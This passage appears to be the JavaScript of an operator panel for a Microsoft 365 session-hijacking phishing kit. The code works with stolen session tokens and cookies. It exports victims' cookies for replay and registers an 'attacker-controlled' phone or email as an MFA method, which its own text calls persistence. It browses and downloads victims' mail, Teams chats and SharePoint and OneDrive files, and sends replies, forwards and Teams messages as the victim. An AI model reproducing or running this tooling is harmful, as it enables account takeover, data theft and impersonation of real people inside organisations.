  h += '<tr><td style="padding:6px 8px;color:var(--text-dim);white-space:nowrap;vertical-align:top">Detail</td><td style="padding:6px 8px;color:var(--text)">'+esc(result.detail)+'</td></tr>';
  if (result.errorCode) h += '<tr><td style="padding:6px 8px;color:var(--text-dim);white-space:nowrap">Error Code</td><td style="padding:6px 8px;color:var(--text);font-family:monospace">'+esc(result.errorCode)+'</td></tr>';
  if (result.errorMsg && result.errorMsg !== result.detail) h += '<tr><td style="padding:6px 8px;color:var(--text-dim);white-space:nowrap;vertical-align:top">API Message</td><td style="padding:6px 8px;color:var(--text);font-size:16px;word-break:break-word">'+esc(result.errorMsg)+'</td></tr>';
  h += '</table>';
  if (result.reason === "stepup_mfa_required") {
    h += '<div style="margin-top:14px;padding:10px 12px;background:rgba(210,153,34,.1);border:1px solid rgba(210,153,34,.3);border-radius:4px;font-size:16px;color:var(--orange)">';
    h += '<b>Step-Up MFA Detected:</b> The tenant has a Conditional Access policy or Authentication Context that requires additional authentication before modifying security info. ';
    h += 'This is a positive security control. The captured session token alone is not sufficient to add a new MFA method — the user must re-authenticate with a stronger factor.</div>';
  }
  if (result.reason === "insufficient_permissions") {
    h += '<div style="margin-top:14px;padding:10px 12px;background:rgba(248,81,73,.1);border:1px solid rgba(248,81,73,.3);border-radius:4px;font-size:16px;color:var(--red)">';
    h += '<b>Permission Gap:</b> The client app used for this session does not have the UserAuthenticationMethod.ReadWrite permission consented. ';
    h += 'To test this path, try the cookie-based approach: export the session cookies and inject them into a browser, then navigate to <a href="https://aka.ms/mfasetup" target="_blank" style="color:var(--accent)">aka.ms/mfasetup</a>.</div>';
  }
  if (isSuccess) {
    h += '<div style="margin-top:14px;padding:10px 12px;background:rgba(63,185,80,.1);border:1px solid rgba(63,185,80,.3);border-radius:4px;font-size:16px;color:var(--green)">';
    h += '<b>Persistence Established:</b> An attacker-controlled MFA method has been added. The attacker can now independently satisfy MFA challenges. ';
    h += 'Even if the user resets their password, this MFA method persists unless explicitly removed by an admin.</div>';
  }
  if (result.response) {
    h += '<div style="margin-top:14px"><div style="font-size:16px;color:var(--text-dim);margin-bottom:4px">API Response</div>';
    h += '<pre style="font-size:16px;padding:8px;background:var(--surface);border:1px solid var(--border);border-radius:4px;overflow-x:auto;color:var(--text)" id="result-raw">'+esc(JSON.stringify(result.response,null,2))+'</pre></div>';
  }
  h += '</div>';
  area.innerHTML = h;
}

async function runAction(cat, idx) {
  if (!selectedSession) return;
  const a = ACTIONS[cat][idx];
  const btn = document.getElementById("act-"+cat+"-"+idx);
  if (btn) btn.classList.add("loading");
  resultNavStack.length = 0;
  document.getElementById("results-area").innerHTML = '<div style="color:var(--text-dim);padding:20px;text-align:center">Run an action to see results here</div>';

  if (a.action==="export-cookies-etc") {
    const r = await fetch("/sessions/"+selectedSession+"/export",{headers:H});
    const d = await r.json();
    if (d.cookieArray) { downloadBlob(JSON.stringify(toEditThisCookie(d.cookieArray),null,2),"application/json","cookies-editthiscookie.json"); }
    if (btn) btn.classList.remove("loading"); return;
  }
  if (a.action==="export-cookies-netscape") {
    const r = await fetch("/sessions/"+selectedSession+"/export",{headers:H});
    const d = await r.json();
    if (d.cookieArray) { downloadBlob("# Netscape HTTP Cookie File\\n"+toNetscape(d.cookieArray),"text/plain","cookies.txt"); }
    if (btn) btn.classList.remove("loading"); return;
  }
  if (a.action==="copy-cookie-header") {
    const r = await fetch("/sessions/"+selectedSession+"/export",{headers:H});
    const d = await r.json();
    if (d.cookieArray) { navigator.clipboard.writeText(d.cookieArray.join("; ")); alert("Cookie header copied to clipboard"); }
    if (btn) btn.classList.remove("loading"); return;
  }
  if (a.action==="export") {
    const r = await fetch("/sessions/"+selectedSession+"/export",{headers:H});
    const d = await r.json();
    showResult("/export",d);
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="toggle-explorer") {
    toggleExplorer();
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="decode-token") {
    const tok = await getToken(selectedSession);
    if (tok) {
      try { const claims = JSON.parse(atob(tok.split(".")[1].replace(/-/g,"+").replace(/_/g,"/"))); showResult("Token Claims",claims); }
      catch { showResult("Token Claims",{error:"Failed to decode"}); }
    }
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="delete-session") {
    if (!confirm("Delete this session?")) { if (btn) btn.classList.remove("loading"); return; }
    await fetch("/sessions/"+selectedSession+"/delete",{method:"POST",headers:H});
    selectedSession=null; pollSessions();
    document.getElementById("no-session-selected").style.display="";
    document.getElementById("action-panel").style.display="none";
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="compose-email") {
    switchTab("compose",document.querySelectorAll(".tab")[4]);
    renderTemplateChips();
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="add-mfa-phone") {
    var phone = prompt("Enter attacker-controlled phone number (e.g. +15551234567):");
    if (!phone) { if (btn) btn.classList.remove("loading"); return; }
    var phoneSlot = prompt("Phone slot: mobile (primary, overwrites existing!) | alternateMobile (backup, safer) | office (voice only)","alternateMobile");
    if (!phoneSlot) phoneSlot = "alternateMobile";
    var tok = await getToken(selectedSession);
    if (!tok) { showMfaResult("phone",phone,{blocked:true,reason:"no_token",detail:"Could not obtain access token — session may be expired"}); if (btn) btn.classList.remove("loading"); return; }
    try {
      var r = await fetch("https://graph.microsoft.com/v1.0/me/authentication/phoneMethods", {
        method:"POST",
        headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
        body:JSON.stringify({phoneNumber:phone,phoneType:phoneSlot})
      });
      var d = await r.json();
      var res = classifyMfaResponse(r.status,d);
      res.phoneSlot = phoneSlot;
      showMfaResult("phone",phone,res);
    } catch(e) { showMfaResult("phone",phone,{blocked:true,reason:"network_error",detail:e.message}); }
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="add-mfa-email") {
    var mfaEmail = prompt("Enter attacker-controlled email address:");
    if (!mfaEmail) { if (btn) btn.classList.remove("loading"); return; }
    var tok = await getToken(selectedSession);
    if (!tok) { showMfaResult("email",mfaEmail,{blocked:true,reason:"no_token",detail:"Could not obtain access token — session may be expired"}); if (btn) btn.classList.remove("loading"); return; }
    try {
      var r = await fetch("https://graph.microsoft.com/v1.0/me/authentication/emailMethods", {
        method:"POST",
        headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
        body:JSON.stringify({emailAddress:mfaEmail})
      });
      var d = await r.json();
      showMfaResult("email",mfaEmail,classifyMfaResponse(r.status,d));
    } catch(e) { showMfaResult("email",mfaEmail,{blocked:true,reason:"network_error",detail:e.message}); }
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="sp-sites") {
    const data = await spCall(selectedSession, "/search/query?querytext=%27contentclass:STS_Site%27&selectproperties=%27Title,Path,WebTemplate%27&rowlimit=50");
    if (data?.PrimaryQueryResult?.RelevantResults?.Table?.Rows) {
      const rows = data.PrimaryQueryResult.RelevantResults.Table.Rows;
      const sites = rows.map(function(row) {
        const cells = {};
        (row.Cells||[]).forEach(function(c){cells[c.Key]=c.Value;});
        return cells;
      });
      showResult("SharePoint Sites ("+sites.length+")", {sites:sites}, "sp-sites");
    } else {
      showResult("SharePoint Sites", data);
    }
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="sp-search") {
    const q = prompt("Search SharePoint files (keyword):");
    if (!q) { if (btn) btn.classList.remove("loading"); return; }
    const data = await spCall(selectedSession, "/search/query?querytext=%27"+encodeURIComponent(q)+"%27&selectproperties=%27Title,Path,FileExtension,Size,LastModifiedTime,Author%27&rowlimit=50");
    if (data?.PrimaryQueryResult?.RelevantResults?.Table?.Rows) {
      const rows = data.PrimaryQueryResult.RelevantResults.Table.Rows;
      const files = rows.map(function(row) {
        const cells = {};
        (row.Cells||[]).forEach(function(c){cells[c.Key]=c.Value;});
        return cells;
      });
      showResult("SP Search: "+q+" ("+files.length+" results)", {files:files}, "sp-search");
    } else {
      showResult("SP Search: "+q, data);
    }
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="sp-copy") {
    if (!spToken) {
      if (!spHostname) await autoDiscoverSp();
      if (!spToken) await autoMintSpToken();
      if (!spToken) { alert("Could not mint SP token"); if (btn) btn.classList.remove("loading"); return; }
    }
    navigator.clipboard.writeText(spToken);
    alert("SP token copied to clipboard ("+spToken.length+" chars)");
    if (btn) btn.classList.remove("loading");
    return;
  }
  if (a.action==="teams-activity") {
    var recipientUpn = prompt("Recipient UPN (e.g. john.doe@contoso.com):");
    if (!recipientUpn) { if (btn) btn.classList.remove("loading"); return; }
    var activityText = prompt("Notification text:");
    if (!activityText) { if (btn) btn.classList.remove("loading"); return; }
    var tok = await getToken(selectedSession);
    if (!tok) { alert("No token"); if (btn) btn.classList.remove("loading"); return; }
    try {
      var r = await fetch("https://graph.microsoft.com/v1.0/users/"+encodeURIComponent(recipientUpn)+"/teamwork/sendActivityNotification", {
        method: "POST",
        headers: {"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
        body: JSON.stringify({
          topic: {source:"text", value:"Notification", webUrl:"https://teams.microsoft.com"},
          activityType: "systemDefault",
          previewText: {content: activityText}
        })
      });
      if (r.ok || r.status===204) {
        showResult("Activity Notification", {status:"sent",recipient:recipientUpn,text:activityText});
      } else {
        var err = await r.json().catch(function(){return {};});
        showResult("Activity Notification", {error:r.status,message:err.error?.message||"Failed",recipient:recipientUpn});
      }
    } catch(e) {
      showResult("Activity Notification", {error:e.message,recipient:recipientUpn});
    }
    if (btn) btn.classList.remove("loading");
    return;
  }

  // Graph API actions
  let path = a.path;
  if (a.prompt) {
    const q = prompt(a.prompt);
    if (!q) { if (btn) btn.classList.remove("loading"); return; }
    path = path.replace("{q}",encodeURIComponent(q));
  }
  if (a.dynamic) {
    const now = new Date();
    path = path.replace("{start}",now.toISOString()).replace("{end}",new Date(now.getTime()+7*86400000).toISOString());
  }

  const data = await graphCall(selectedSession, path);
  showResult(path, data, a.render);
  if (btn) btn.classList.remove("loading");
}

// ── Drill-down actions (called from rendered results) ───
async function readChat(chatId) {
  const data = await graphCall(selectedSession, "/v1.0/me/chats/"+chatId+"/messages?$top=25");
  showResult("/chats/"+chatId+"/messages", data, "messages");
}
async function readTeamChannels(teamId) {
  const data = await graphCall(selectedSession, "/v1.0/teams/"+teamId+"/channels");
  showResult("/teams/"+teamId+"/channels", data, "channels");
}
var activeTeamId = null;
var activeChannelId = null;

async function readChannelMsgs(teamId, channelId) {
  channelId = decodeURIComponent(channelId);
  activeTeamId = teamId;
  activeChannelId = channelId;
  const data = await graphCall(selectedSession, "/v1.0/teams/"+teamId+"/channels/"+channelId+"/messages?$top=25");
  showResult("/channels/"+channelId+"/messages", data, "channel-messages");
}

async function readChannelMembers(teamId, channelId) {
  channelId = decodeURIComponent(channelId);
  const data = await graphCall(selectedSession, "/v1.0/teams/"+teamId+"/channels/"+channelId+"/members");
  showResult("/channels/"+channelId+"/members", data, "channel-members");
}

async function sendChannelMessage() {
  if (!activeTeamId || !activeChannelId || !selectedSession) return;
  var input = document.getElementById("channel-msg-input");
  var msg = input.value.trim();
  if (!msg) return;
  var btn = document.getElementById("channel-send-btn");
  btn.disabled = true; btn.textContent = "Sending...";
  var tok = await getToken(selectedSession);
  if (!tok) { btn.disabled = false; btn.textContent = "Send"; alert("No token"); return; }
  try {
    var r = await fetch("https://graph.microsoft.com/v1.0/teams/"+activeTeamId+"/channels/"+activeChannelId+"/messages", {
      method: "POST",
      headers: {"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
      body: JSON.stringify({body:{content:msg}})
    });
    if (r.ok) {
      input.value = "";
      btn.disabled = false; btn.textContent = "Send";
      readChannelMsgs(activeTeamId, encodeURIComponent(activeChannelId));
    } else {
      var err = await r.json().catch(function(){return {};});
      alert("Send failed: "+(err.error?.message || r.status));
      btn.disabled = false; btn.textContent = "Send";
    }
  } catch(e) {
    alert("Send error: "+e.message);
    btn.disabled = false; btn.textContent = "Send";
  }
}
async function browseFolder(itemId) {
  const data = await graphCall(selectedSession, "/v1.0/me/drive/items/"+itemId+"/children");
  showResult("/drive/"+itemId, data, "files");
}
var lastEmailData = null;

async function readEmail(msgId) {
  const data = await graphCall(selectedSession, "/v1.0/me/messages/"+msgId+"?$select=id,subject,from,toRecipients,ccRecipients,receivedDateTime,body,bodyPreview,internetMessageHeaders");
  lastEmailData = data;
  showResult("/messages/"+msgId, data, "email-detail");
}

function toggleEmailHeaders() {
  var el = document.getElementById("email-headers-panel");
  var btn = document.getElementById("email-headers-btn");
  if (!el) return;
  if (el.style.display === "none") {
    el.style.display = "block";
    if (btn) btn.textContent = "Hide Headers";
  } else {
    el.style.display = "none";
    if (btn) btn.textContent = "Headers";
  }
}

function replyToEmail(replyAll) {
  if (!lastEmailData || !lastEmailData.id) { alert("No email loaded"); return; }
  var d = lastEmailData;
  var from = d.from?.emailAddress?.address || "";
  var subject = d.subject || "";
  if (!subject.match(/^re:/i)) subject = "Re: " + subject;
  var area = document.getElementById("results-area");
  var h = '<div class="result-header"><span class="path">' + (replyAll ? 'Reply All' : 'Reply') + ' — ' + esc(subject) + '</span></div>';
  h += '<div style="padding:10px">';
  h += '<div style="margin-bottom:6px"><label style="font-size:16px;font-weight:600;color:var(--text);display:block;margin-bottom:3px">TO</label>';
  h += '<input id="reply-to" value="' + esc(from) + '" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px"></div>';
  if (replyAll) {
    var ccAddrs = (d.toRecipients||[]).concat(d.ccRecipients||[]).map(function(r){return r.emailAddress?.address||"";}).filter(Boolean);
    h += '<div style="margin-bottom:6px"><label style="font-size:16px;font-weight:600;color:var(--text);display:block;margin-bottom:3px">CC</label>';
    h += '<input id="reply-cc" value="' + esc(ccAddrs.join(", ")) + '" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px"></div>';
  }
  h += '<div style="margin-bottom:6px"><label style="font-size:16px;font-weight:600;color:var(--text);display:block;margin-bottom:3px">SUBJECT</label>';
  h += '<input id="reply-subject" value="' + esc(subject) + '" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px"></div>';
  h += '<div style="margin-bottom:6px"><label style="font-size:16px;color:var(--text-dim);display:block;margin-bottom:3px">MESSAGE</label>';
  h += '<textarea id="reply-body" rows="8" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:8px 10px;font-family:inherit;font-size:16px;border-radius:4px;resize:vertical" placeholder="Type your reply..."></textarea></div>';
  h += '<div style="display:flex;gap:8px;align-items:center">';
  h += '<button onclick="sendEmailReply(&quot;' + d.id + '&quot;,' + replyAll + ')" style="background:var(--accent);border:1px solid var(--accent);color:var(--bg);padding:6px 18px;font-family:inherit;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer">Send ' + (replyAll ? 'Reply All' : 'Reply') + '</button>';
  h += '<button onclick="readEmail(&quot;' + d.id + '&quot;)" style="font-size:16px;font-family:inherit;padding:6px 14px;border:1px solid var(--border);background:none;color:var(--text-dim);border-radius:4px;cursor:pointer">Cancel</button>';
  h += '<span id="reply-status" style="font-size:16px;color:var(--text-dim)"></span>';
  h += '</div></div>';
  area.innerHTML = h;
}

function forwardEmail() {
  if (!lastEmailData || !lastEmailData.id) { alert("No email loaded"); return; }
  var d = lastEmailData;
  var subject = d.subject || "";
  if (!subject.match(/^fw:/i)) subject = "Fw: " + subject;
  var area = document.getElementById("results-area");
  var h = '<div class="result-header"><span class="path">Forward — ' + esc(subject) + '</span></div>';
  h += '<div style="padding:10px">';
  h += '<div style="margin-bottom:6px"><label style="font-size:16px;font-weight:600;color:var(--text);display:block;margin-bottom:3px">TO</label>';
  h += '<input id="reply-to" placeholder="recipient@company.com" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:16px;border-radius:4px"></div>';
  h += '<div style="margin-bottom:6px"><label style="font-size:16px;color:var(--text-dim);display:block;margin-bottom:3px">MESSAGE (prepended to forwarded email)</label>';
  h += '<textarea id="reply-body" rows="4" style="width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:8px 10px;font-family:inherit;font-size:16px;border-radius:4px;resize:vertical" placeholder="Optional note..."></textarea></div>';
  h += '<div style="display:flex;gap:8px;align-items:center">';
  h += '<button onclick="sendEmailForward(&quot;' + d.id + '&quot;)" style="background:var(--accent);border:1px solid var(--accent);color:var(--bg);padding:6px 18px;font-family:inherit;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer">Forward</button>';
  h += '<button onclick="readEmail(&quot;' + d.id + '&quot;)" style="font-size:16px;font-family:inherit;padding:6px 14px;border:1px solid var(--border);background:none;color:var(--text-dim);border-radius:4px;cursor:pointer">Cancel</button>';
  h += '<span id="reply-status" style="font-size:16px;color:var(--text-dim)"></span>';
  h += '</div></div>';
  area.innerHTML = h;
}

async function sendEmailReply(msgId, replyAll) {
  if (!selectedSession) return;
  var status = document.getElementById("reply-status");
  var replyBody = document.getElementById("reply-body").value;
  if (!replyBody.trim()) { alert("Reply body is empty"); return; }
  status.textContent = "Sending...";
  var tok = await getToken(selectedSession);
  if (!tok) { status.innerHTML = '<span style="color:var(--red)">Failed to acquire token</span>'; return; }

  var endpoint = replyAll ? "replyAll" : "reply";
  var payload = { comment: replyBody };

  try {
    var r = await fetch("https://graph.microsoft.com/v1.0/me/messages/"+msgId+"/"+endpoint, {
      method: "POST",
      headers: {"Authorization":"Bearer "+tok, "Content-Type":"application/json"},
      body: JSON.stringify(payload)
    });
    if (r.status===202||r.status===200) {
      status.innerHTML = '<span style="color:var(--green)">\\u2713 Reply sent</span>';
    } else {
      var errText = await r.text();
      var errMsg = ""; try { errMsg = JSON.parse(errText).error.message; } catch(e2) { errMsg = errText.substring(0,200); }
      status.innerHTML = '<span style="color:var(--red)">Failed ('+r.status+'): '+esc(errMsg)+'</span>';
    }
  } catch(e) {
    status.innerHTML = '<span style="color:var(--red)">Error: '+esc(e.message)+'</span>';
  }
}

async function sendEmailForward(msgId) {
  if (!selectedSession) return;
  var status = document.getElementById("reply-status");
  var toRaw = document.getElementById("reply-to").value;
  var toAddrs = toRaw.split(",").map(function(e){return e.trim();}).filter(Boolean);
  if (!toAddrs.length) { alert("Enter at least one recipient"); return; }
  var bad = toAddrs.filter(function(a){ return !looksLikeEmail(a); });
  if (bad.length) { alert("Invalid address: " + bad[0]); return; }
  var comment = document.getElementById("reply-body").value;
  status.textContent = "Sending...";
  var tok = await getToken(selectedSession);
  if (!tok) { status.innerHTML = '<span style="color:var(--red)">Failed to acquire token</span>'; return; }

  var payload = {
    comment: comment,
    toRecipients: toAddrs.map(function(a){return {emailAddress:{address:a}};})
  };

  try {
    var r = await fetch("https://graph.microsoft.com/v1.0/me/messages/"+msgId+"/forward", {
      method: "POST",
      headers: {"Authorization":"Bearer "+tok, "Content-Type":"application/json"},
      body: JSON.stringify(payload)
    });
    if (r.status===202||r.status===200) {
      status.innerHTML = '<span style="color:var(--green)">\\u2713 Email forwarded</span>';
    } else {
      var errText = await r.text();
      var errMsg = ""; try { errMsg = JSON.parse(errText).error.message; } catch(e2) { errMsg = errText.substring(0,200); }
      status.innerHTML = '<span style="color:var(--red)">Failed ('+r.status+'): '+esc(errMsg)+'</span>';
    }
  } catch(e) {
    status.innerHTML = '<span style="color:var(--red)">Error: '+esc(e.message)+'</span>';
  }
}

async function browseMailFolder(folderId, folderName) {
  const data = await graphCall(selectedSession, "/v1.0/me/mailFolders/"+folderId+"/messages?$top=25&$select=subject,from,receivedDateTime,bodyPreview");
  showResult("/mailFolders/"+encodeURIComponent(folderName)+"/messages", data, "emails");
}
async function viewAppRole(resourceId, resourceName) {
  const data = await graphCall(selectedSession, "/v1.0/servicePrincipals/"+resourceId);
  showResult("/servicePrincipals/"+encodeURIComponent(resourceName), data);
}
async function browseSite(siteId) {
  const data = await graphCall(selectedSession, "/v1.0/sites/"+siteId+"/drives");
  showResult("/sites/"+siteId+"/drives", data, "drives");
}
async function browseDrive(driveId) {
  const data = await graphCall(selectedSession, "/v1.0/drives/"+driveId+"/root/children");
  showResult("/drives/"+driveId, data, "files");
}
async function viewFileDetail(itemId) {
  const data = await graphCall(selectedSession, "/v1.0/me/drive/items/"+itemId);
  showResult("/drive/items/"+itemId, data);
}
async function downloadFile(idx) {
  const f = lastFileItems[idx];
  if (!f) { alert("File metadata not found"); return; }
  const tok = await getToken(selectedSession);
  if (!tok) return;
  try {
    const remote = f.remoteItem;
    const driveId = remote?.parentReference?.driveId || f.parentReference?.driveId;
    const itemId = remote?.id || f.id;
    const fileName = remote?.name || f.name || "download";
    let contentPath;
    if (driveId) {
      contentPath = "/v1.0/drives/"+driveId+"/items/"+itemId+"/content";
    } else {
      contentPath = "/v1.0/me/drive/items/"+itemId+"/content";
    }
    const r = await fetch("https://graph.microsoft.com"+contentPath,{headers:{"Authorization":"Bearer "+tok}});
    if (!r.ok) { alert("Download failed: "+r.status); return; }
    const blob = await r.blob();
    downloadBlob(blob, blob.type, fileName);
  } catch(e) { alert("Download error: "+e.message); }
}

// ── SharePoint drill-down actions ──────────────────────
async function spBrowseSite(siteUrl) {
  const data = await spCall(selectedSession, "/web/webs?$select=Title,Url,ServerRelativeUrl");
  if (!data) {
    const data2 = await spCall(selectedSession, "/search/query?querytext=%27path:%22"+encodeURIComponent(siteUrl)+"%22%20contentclass:STS_List_DocumentLibrary%27&selectproperties=%27Title,Path%27&rowlimit=50");
    showResult("SP Site: "+siteUrl, data2);
    return;
  }
  showResult("SP Site: "+siteUrl, data);
}

async function spBrowseLibrary(siteUrl, libTitle) {
  const relUrl = new URL(siteUrl).pathname;
  const apiPath = "/web/GetFolderByServerRelativeUrl(%27"+encodeURIComponent(relUrl+"/"+libTitle)+"%27)/Files?$select=Name,ServerRelativeUrl,Length,TimeLastModified";
  const data = await spCall(selectedSession, apiPath);
  if (data?.value) {
    showResult("SP Library: "+libTitle, {value:data.value}, "sp-files");
  } else {
    showResult("SP Library: "+libTitle, data);
  }
}

async function spBrowseFolder(serverRelUrl) {
  const encoded = encodeURIComponent(serverRelUrl).replace(/%2F/g,"/");
  const filesPath = "/web/GetFolderByServerRelativeUrl(%27"+encoded+"%27)/Files?$select=Name,ServerRelativeUrl,Length,TimeLastModified";
  const foldersPath = "/web/GetFolderByServerRelativeUrl(%27"+encoded+"%27)/Folders?$select=Name,ServerRelativeUrl,ItemCount";
  const filesData = await spCall(selectedSession, filesPath);
  const foldersData = await spCall(selectedSession, foldersPath);
  const combined = [];
  if (foldersData?.value) foldersData.value.forEach(function(f){combined.push({Name:f.Name,ServerRelativeUrl:f.ServerRelativeUrl,isFolder:true,ItemCount:f.ItemCount});});
  if (filesData?.value) filesData.value.forEach(function(f){combined.push({Name:f.Name,ServerRelativeUrl:f.ServerRelativeUrl,Length:f.Length,TimeLastModified:f.TimeLastModified,isFolder:false});});
  showResult("SP Folder: "+serverRelUrl, {value:combined}, "sp-files");
}

async function spDownloadFile(serverRelUrl, fileName) {
  const tok = await getSpToken(selectedSession);
  if (!tok || !spHostname) return;
  try {
    const encoded = encodeURIComponent(serverRelUrl).replace(/%2F/g,"/");
    const url = "https://"+spHostname+"/_api/web/GetFileByServerRelativeUrl(%27"+encoded+"%27)/$value";
    const r = await fetch(url,{headers:{"Authorization":"Bearer "+tok}});
    if (!r.ok) { alert("SP Download failed: "+r.status); return; }
    const blob = await r.blob();
    downloadBlob(blob, blob.type, fileName);
  } catch(e) { alert("SP Download error: "+e.message); }
}

// ── Result rendering ────────────────────────────────────
var resultNavStack = [];
function navBack() {
  if (resultNavStack.length) {
    document.getElementById("results-area").innerHTML = resultNavStack.pop();
  } else {
    switchTab("actions",document.querySelectorAll(".tab")[0]);
  }
}
function showResult(path, data, renderer) {
  const area = document.getElementById("results-area");
  const current = area.innerHTML;
  if (current && !current.match(/Run an action to see results here/)) {
    resultNavStack.push(current);
  }
  switchTab("results",document.querySelectorAll(".tab")[1]);
  let html = '<div class="result-header"><button onclick="navBack()" style="background:none;border:1px solid var(--border);color:var(--text-dim);padding:2px 10px;border-radius:3px;cursor:pointer;font-size:16px;font-family:inherit;margin-right:8px">&larr; Back</button><span class="path">'+esc(path)+'</span><button onclick="copyResult()">Copy JSON</button></div>';

  if (!data) { html += '<div class="result-json" id="result-raw" style="color:var(--red)">No data / access denied</div>'; area.innerHTML=html; return; }
  if (data.error && typeof data.error!=="object") { html += '<div class="result-json" id="result-raw" style="color:var(--red)">Error '+esc(String(data.error))+': '+esc(data.message||"")+'</div>'; area.innerHTML=html; return; }

  const items = data.value || null;

  if (renderer==="emails" && items) {
    html += '<table class="result-table"><tr><th>From</th><th>Subject</th><th>Date</th></tr>';
    for (const m of items) {
      html += '<tr class="clickable" onclick="readEmail(\\''+m.id+'\\')"><td>'+esc(m.from?.emailAddress?.address||"?")+'</td><td>'+esc(m.subject||"(none)")+'</td><td>'+esc((m.receivedDateTime||"").split("T")[0])+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="email-detail" && data.body) {
    var toList = (data.toRecipients||[]).map(function(r){return r.emailAddress?.address||"";}).filter(Boolean).join(", ");
    var ccList = (data.ccRecipients||[]).map(function(r){return r.emailAddress?.address||"";}).filter(Boolean).join(", ");
    html += '<div class="session-detail"><b>'+esc(data.subject||"")+'</b><br>From: '+esc(data.from?.emailAddress?.address||"?")+' | '+esc((data.receivedDateTime||"").split("T")[0]);
    if (toList) html += '<br>To: '+esc(toList);
    if (ccList) html += '<br>CC: '+esc(ccList);
    html += '<div style="margin-top:8px;display:flex;gap:6px">';
    html += '<button onclick="replyToEmail(false)" style="font-size:16px;font-family:inherit;padding:4px 12px;border:1px solid var(--accent);background:none;color:var(--accent);border-radius:3px;cursor:pointer">Reply</button>';
    html += '<button onclick="replyToEmail(true)" style="font-size:16px;font-family:inherit;padding:4px 12px;border:1px solid var(--accent);background:none;color:var(--accent);border-radius:3px;cursor:pointer">Reply All</button>';
    html += '<button onclick="forwardEmail()" style="font-size:16px;font-family:inherit;padding:4px 12px;border:1px solid var(--border);background:none;color:var(--text-dim);border-radius:3px;cursor:pointer">Forward</button>';
    html += '<button id="email-headers-btn" onclick="toggleEmailHeaders()" style="font-size:16px;font-family:inherit;padding:4px 12px;border:1px solid var(--border);background:none;color:var(--text-dim);border-radius:3px;cursor:pointer">Headers</button>';
    html += '</div></div>';
    if (data.internetMessageHeaders && data.internetMessageHeaders.length) {
      html += '<div id="email-headers-panel" style="display:none;background:var(--surface);border:1px solid var(--border);border-radius:4px;margin:6px 10px;padding:8px 10px;max-height:400px;overflow-y:auto">';
      html += '<table style="width:100%;font-size:16px;font-family:monospace;border-collapse:collapse">';
      for (var hi=0; hi<data.internetMessageHeaders.length; hi++) {
        var hdr = data.internetMessageHeaders[hi];
        var hname = esc(hdr.name||"");
        var hval = esc(hdr.value||"");
        var highlight = /^(authentication-results|x-ms-exchange-organization-scl|x-forefront|x-microsoft-antispam|received-spf|dkim-signature|arc-|x-avanan|x-checkpoint|x-ironport|x-proofpoint|x-barracuda)/i.test(hdr.name) ? "color:var(--orange);font-weight:600" : "color:var(--text-dim)";
        html += '<tr><td style="padding:2px 8px 2px 0;white-space:nowrap;vertical-align:top;'+highlight+'">'+hname+'</td><td style="padding:2px 0;color:var(--text);word-break:break-all">'+hval+'</td></tr>';
      }
      html += '</table></div>';
    } else {
      html += '<div id="email-headers-panel" style="display:none;background:var(--surface);border:1px solid var(--border);border-radius:4px;margin:6px 10px;padding:10px;font-size:16px;color:var(--text-dim)">No internet message headers available for this message.</div>';
    }
    html += '<div class="result-json" style="white-space:normal">'+data.body.content+'</div>';
  } else if (renderer==="chats" && items) {
    html += '<table class="result-table"><tr><th>Chat</th><th>Type</th><th>Members</th></tr>';
    for (const c of items) {
      const topic = c.topic || c.chatType || "chat";
      const members = (c.members||[]).map(m=>m.displayName||"?").join(", ");
      html += '<tr class="clickable" onclick="readChat(\\''+c.id+'\\')"><td>'+esc(topic)+'</td><td>'+esc(c.chatType||"")+'</td><td>'+esc(members)+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="channel-messages" && items) {
    html += '<div style="display:flex;flex-direction:column;gap:6px">';
    for (const m of items) {
      const from = m.from?.user?.displayName || m.from?.application?.displayName || "system";
      const body = (m.body?.content||"").replace(/<[^>]*>/g,"").substring(0,300);
      const ts = (m.createdDateTime||"").replace("T"," ").substring(0,19);
      html += '<div class="session-detail"><b>'+esc(from)+'</b> <span style="color:var(--text-dim);font-size:16px">'+esc(ts)+'</span><br>'+esc(body)+'</div>';
    }
    html += '</div>';
    html += '<div style="margin-top:10px;display:flex;gap:6px;align-items:center">';
    html += '<input id="channel-msg-input" type="text" placeholder="Type a message\\u2026" style="flex:1;padding:8px 10px;background:var(--surface2);border:1px solid var(--border);color:var(--text);font-family:inherit;font-size:14px;border-radius:4px" onkeydown="if(event.key===\\'Enter\\')sendChannelMessage()">';
    html += '<button id="channel-send-btn" onclick="sendChannelMessage()" style="padding:8px 16px;background:var(--accent);border:none;color:#fff;font-family:inherit;font-size:14px;font-weight:600;border-radius:4px;cursor:pointer;white-space:nowrap">Send</button>';
    html += '</div>';
  } else if (renderer==="channel-members" && items) {
    html += '<table class="result-table"><tr><th>Name</th><th>Email</th><th>Role</th></tr>';
    for (const m of items) {
      html += '<tr><td>'+esc(m.displayName||"?")+'</td><td>'+esc(m.email||"")+'</td><td>'+esc((m.roles||[]).join(", ")||"member")+'</td></tr>';
    }
    html += '</table>';
  } else if (renderer==="messages" && items) {
    html += '<div style="display:flex;flex-direction:column;gap:6px">';
    for (const m of items) {
